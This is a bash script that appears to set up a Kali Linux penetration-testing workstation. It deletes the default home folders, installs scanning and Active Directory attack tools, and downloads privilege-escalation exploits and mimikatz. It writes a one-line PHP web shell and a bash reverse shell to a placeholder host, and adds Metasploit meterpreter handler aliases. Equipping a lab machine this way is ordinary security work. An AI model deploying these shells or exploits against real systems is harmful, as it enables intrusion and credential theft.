#!/usr/bin/env bash
sudo apt remove needrestart -y
cd /$HOME/
sudo rm -rf Documents/ Videos/ Pictures/ Music/ Templates/ Public/ Desktop/ 2>/dev/null
sudo mkdir Tools
mkdir misc
mkdir home
sudo apt-get -o DPkg::options::=--force-confdef -o DPkg::options::=--force-confold update -y 
sudo apt-get -o DPkg::options::=--force-confdef -o DPkg::options::=--force-confold upgrade -y
sudo apt-get -o DPkg::options::=--force-confdef -o DPkg::options::=--force-confold install gedit -y
sudo apt-get -o DPkg::options::=--force-confdef -o DPkg::options::=--force-confold install rlwrap -y
sudo apt-get -o DPkg::options::=--force-confdef -o DPkg::options::=--force-confold install fcrackzip -y
sudo apt-get -o DPkg::options::=--force-confdef -o DPkg::options::=--force-confold install gobuster -y
sudo apt-get -o DPkg::options::=--force-confdef -o DPkg::options::=--force-confold install evil-winrm -y
sudo apt-get -o DPkg::options::=--force-confdef -o DPkg::options::=--force-confold install wpscan -y
sudo apt-get -o DPkg::options::=--force-confdef -o DPkg::options::=--force-confold install nikto -y
sudo apt-get -o DPkg::options::=--force-confdef -o DPkg::options::=--force-confold install dirsearch -y
sudo apt-get -o DPkg::options::=--force-confdef -o DPkg::options::=--force-confold install python3-pip -y
sudo apt-get -o DPkg::options::=--force-confdef -o DPkg::options::=--force-confold install amap -y
sudo apt-get -o DPkg::options::=--force-confdef -o DPkg::options::=--force-confold install nishang -y
sudo apt-get -o DPkg::options::=--force-confdef -o DPkg::options::=--force-confold install docker.io -y
sudo apt-get -o DPkg::options::=--force-confdef -o DPkg::options::=--force-confold install subfinder -y
sudo apt-get -o DPkg::options::=--force-confdef -o DPkg::options::=--force-confold install neo4j -y
sudo apt-get -o DPkg::options::=--force-confdef -o DPkg::options::=--force-confold install bloodhound -y  
sudo apt-get -o DPkg::options::=--force-confdef -o DPkg::options::=--force-confold install libreoffice-common -y
sudo apt-get -o DPkg::options::=--force-confdef -o DPkg::options::=--force-confold install libreoffice-writer -y
sudo apt-get -o DPkg::options::=--force-confdef -o DPkg::options::=--force-confold install feroxbuster -y
sudo gem install haiti-hash
sudo apt install kali-wallpapers-all -y
sudo docker pull rustscan/rustscan:latest 
sudo docker pull projectdiscovery/nuclei:latest
sudo searchsploit -u
sudo nmap --script-updatedb
sudo apt-get install golang -y
echo "export GOROOT=/usr/lib/go" >> /$HOME/.bashrc
echo "export GOPATH=$HOME/go" >> /$HOME/.bashrc
echo "export PATH=$GOPATH/bin:$GOROOT/bin:$PATH" >> /$HOME/.bashrc
echo "export GOROOT=/usr/lib/go" >> /$HOME/.zshrc
echo "export GOPATH=$HOME/go" >> /$HOME/.zshrc
echo "export PATH=$GOPATH/bin:$GOROOT/bin:$PATH" >> /$HOME/.zshrc
cd /usr/share/wordlists/
sudo rm -rf master.zip 2>/dev/null
sudo rm -rf seclists 2>/dev/null
sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip; sudo unzip -q master.zip; sudo rm -rf master.zip; sudo mv SecLists-master seclists
sudo gzip -d rockyou.txt.gz
cd /$HOME/Tools/
sudo mkdir web
sudo mkdir linux
sudo mkdir windows
cd windows; sudo mkdir AD
cd /$HOME/Tools/linux
sudo wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
sudo wget https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py
sudo wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
sudo wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
sudo wget https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/blob/main/poc.sh; sudo mv poc.sh polkit.sh
sudo wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c; sudo mv exploit.c dirtypipe.c
sudo wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c; sudo mv dirty.c dirtycow.c
sudo wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh; sudo mv lse.sh LinuxSmartEnum.sh
sudo wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64 -O pspy64
sudo wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz -O chisel_linuxv177.gz; sudo gunzip -d chisel_linuxv177.gz
cd /$HOME/Tools/windows/AD
sudo git clone https://github.com/Ridter/noPac
sudo git clone https://github.com/harshil-shah004/zerologon-CVE-2020-1472.git
sudo wget https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1
sudo wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute; sudo chmod +x kerbrute
sudo wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1 -O SharpHound.ps1
sudo wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe -O SharpHound.exe
sudo wget https://github.com/byronkg/SharpGPOAbuse/raw/main/SharpGPOAbuse-master/SharpGPOAbuse.exe -O SharpGPOAbuse.exe
sudo wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -O PowerView.ps1 
sudo git clone https://github.com/fox-it/BloodHound.py.git; cd BloodHound.py/; sudo pip install .
cd /$HOME/Tools/web
sudo git clone https://github.com/stamparm/DSSS.git
sudo git clone https://github.com/Tuhinshubhra/CMSeeK
sudo wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py
sudo git clone https://github.com/s0md3v/XSStrike
sudo git clone https://github.com/dievus/msdorkdump.git
sudo git clone https://github.com/Dionach/CMSmap; cd CMSmap; sudo pip3 install .
cd /$HOME/home/
wget https://raw.githubusercontent.com/h1dz/Cyber/Scripts/nmap.sh; chmod +x nmap.sh; mv nmap.sh NmapScan.sh
wget https://raw.githubusercontent.com/h1dz/Cyber/Scripts/masscan.sh; chmod +x masscan.sh
wget https://raw.githubusercontent.com/h1dz/Cyber/Scripts/vhosts.sh; chmod +x vhosts.sh
wget https://raw.githubusercontent.com/h1dz/Cyber/Scripts/ping.sh; chmod +x ping.sh
wget https://raw.githubusercontent.com/h1dz/Cyber/Scripts/gobuster.sh; chmod +x gobuster.sh; mv gobuster.sh go.sh
wget https://raw.githubusercontent.com/h1dz/Cyber/Scripts/phpshell.php
cat << EOF > /$HOME/home/webshell.php
<?PHP system($_GET['cmd']); ?>
EOF
cat << EOF > /$HOME/home/bashshell.sh
/bin/bash -c '/bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
chmod +x bashshell.sh
EOF
cd /$HOME/Tools/windows/
sudo wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz -O chisel_windowsv177.gz; sudo gunzip -d chisel_windowsv177.gz
sudo wget https://raw.githubusercontent.com/h1dz/Windows-Tools/master/powerup.ps1 -O powerup.ps1
sudo wget https://github.com/carlospolop/PEASS-ng/releases/download/20220203/winPEASx64.exe -O winPEASx64.exe
sudo wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -O JuicyPotato.exe
sudo wget https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip -O RoguePotato.zip; sudo unzip -q RoguePotato.zip; sudo rm -rf RoguePotato.zip RogueOxidResolver.exe
sudo wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe -O nc64.exe
sudo wget https://github.com/h1dz/Windows-Tools2/raw/master/Rubeus.exe -O Rubeus.exe
sudo wget https://github.com/h1dz/Windows-Tools2/raw/master/PsExec.exe -O psexec.exe
sudo wget https://nmap.org/dist/nmap-7.92-win32.zip -O nmap.zip; sudo unzip nmap.zip; sudo rm -rf nmap.zip
sudo mkdir mimi; cd mimi
sudo wget https://gitlab.com/kalilinux/packages/mimikatz/-/raw/kali/master/x64/mimidrv.sys - O mimidrv.sys
sudo wget https://gitlab.com/kalilinux/packages/mimikatz/-/raw/kali/master/x64/mimikatz.exe - O mimikatz.exe
sudo wget https://gitlab.com/kalilinux/packages/mimikatz/-/raw/kali/master/x64/mimilib.dll - O mimilib.dll
sudo wget https://gitlab.com/kalilinux/packages/mimikatz/-/raw/kali/master/x64/mimispool.dll - O mimispool.dll
cd /$HOME/
echo "alias msf1='sudo msfconsole -q -x \"use exploit/multi/handler; set payload /linux/meterpreter/reverse_tcp; set lhost tun0; set lport 443; exploit\"'" >> /$HOME/.bash_aliases
echo "alias msf2='sudo msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD /windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 443; exploit\"'" >> /$HOME/.bash_aliases
echo "alias ipa='ip -br addr show'" >> /$HOME/.bash_aliases
echo "alias lll='ls -la --color=auto'" >> /$HOME/.bash_aliases
echo "alias scan='sudo /$HOME/home/NmapScan.sh $1'" >> /$HOME/.bash_aliases
echo "alias mass='sudo /$HOME/home/masscan.sh $1'" >> /$HOME/.bash_aliases
echo "alias s='searchsploit'" >> /$HOME/.bash_aliases
echo "alias ncl='sudo rlwrap -r -c -l RevShellLogs.txt nc -lvnkp 443'" >> /$HOME/.bash_aliases
echo "alias home='cd /$HOME/home'" >> /$HOME/.bash_aliases
echo "alias tools='cd /$HOME/Tools'" >> /$HOME/.bash_aliases
echo "alias pys='sudo python3 -m http.server 80'" >> /$HOME/.bash_aliases
echo "alias rmv='sudo rm -rf hash id_rsa exploit.py exploit.sh hash.txt user.txt pass.txt names.txt name.txt sharesSMB.txt smbResults ports3.txt ports2.txt ports1.txt ports0.txtnmap.txt masscan4.txt masscan3.txt masscan2.txt masscan1.txt Gobusterscan.txt GobusterExt_DUMP.txt Gobuster_DUMP.txt'" >> /home/kali/.bash_aliases
echo "alias gob='sudo /$HOME/home/go.sh $1'" >> /$HOME/.bash_aliases
echo "alias drs1='dirsearch -w /usr/share/wordlists/dirb/common.txt -f -r --random-agent --full-url -u $1'" >> /$HOME/.bash_aliases
echo "alias drs2='dirsearch -w /usr/share/wordlists/dirb/big.txt -f -r --random-agent --full-url -u $1'" >> /$HOME/.bash_aliases
echo "alias gob2='gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -e -q -f -x php,html,txt -u http://$1'" >> /$HOME/.bash_aliases
echo "alias msf1='sudo msfconsole -q -x \"use exploit/multi/handler; set payload /linux/meterpreter/reverse_tcp; set lhost tun0; set lport 443; exploit\"'" >> /$HOME/.zshrc
echo "alias msf2='sudo msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD /windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 443; exploit\"'" >> /$HOME/.zshrc
echo "alias ipa='ip -br addr show'" >> /$HOME/.zshrc
echo "alias lll='ls -la --color=auto'" >> /$HOME/.zshrc
echo "alias scan='sudo /$HOME/home/NmapScan.sh $1'" >> /$HOME/.zshrc
echo "alias mass='sudo /$HOME/home/masscan.sh $1'" >> /$HOME/.zshrc
echo "alias s='searchsploit'" >> /$HOME/.zshrc
echo "alias ncl='sudo rlwrap -r -c -l RevShellLogs.txt nc -lvnkp 443'" >> /$HOME/.zshrc
echo "alias home='cd /$HOME/home'" >> /$HOME/.zshrc
echo "alias tools='cd /$HOME/Tools'" >> /$HOME/.zshrc
echo "alias pys='sudo python3 -m http.server 80'" >> /$HOME/.zshrc
echo "alias rmv='sudo rm -rf hash id_rsa exploit.py exploit.sh hash.txt user.txt pass.txt names.txt name.txt sharesSMB.txt smbResults ports3.txt ports2.txt ports1.txt ports0.txtnmap.txt masscan4.txt masscan3.txt masscan2.txt masscan1.txt Gobusterscan.txt GobusterExt_DUMP.txt Gobuster_DUMP.txt'" >> /home/kali/.zshrc
echo "alias gob='sudo /$HOME/home/go.sh $1'" >> /$HOME/.zshrc
echo "alias drs1='dirsearch -w /usr/share/wordlists/dirb/common.txt -f -r --random-agent --full-url -u $1'" >> /$HOME/.zshrc
echo "alias drs2='dirsearch -w /usr/share/wordlists/dirb/big.txt -f -r --random-agent --full-url -u $1'" >> /$HOME/.zshrc
echo "alias gob2='gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -e -q -f -x php,html,txt -u http://$1'" >> /$HOME/.zshrc
sudo xfconf-query -c xsettings -p /Net/IconThemeName -s Flat-Remix-Blue-Dark
sudo xfconf-query -c xsettings -p /Net/ThemeName -s Kali-Dark
sudo xfconf-query -c xfwm4 -p /general/theme -s Kali-Dark
sudo gsettings set org.xfce.mousepad.preferences.view color-scheme Kali-Dark
source .bash_aliases
source .zshrc
clear
tput setaf 3; printf "\n\nInstallation Complete!"
rm -rf setup.sh 2>/dev/null
